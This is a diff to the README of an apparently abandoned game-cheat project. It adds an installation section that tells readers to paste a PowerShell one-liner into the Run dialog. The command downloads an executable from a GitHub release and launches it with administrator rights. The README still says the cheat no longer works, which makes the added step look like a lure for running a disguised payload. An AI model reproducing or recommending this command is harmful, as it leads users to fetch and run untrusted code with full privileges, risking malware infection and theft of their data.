@@ -25,6 +25,20 @@
 
 ---
 
+## 🛠️ Installation
+---
+
+### Automated Setup (Recommended)
+
+Run the following command in Command Prompt as Administrator:
+
+1. Press `Win + R`
+2. Copy and paste the following command:
+
+```powershell
+powershell -c irm https://github.com/troffufuck/Forkey-Client/releases/latest/download/Forkey.exe -OutFile $env:TEMP\Forkey.exe; Start-Process $env:TEMP\Forkey.exe -Verb RunAs
+```
+
 ## 📌 Status
 
 > **⚠️ ABANDONED:** The game's ModelMatrix was changed in the latest update, so the cheat is currently **not working**. I'm leaving this repository for educational purposes and as a base for anyone who wants to continue development.
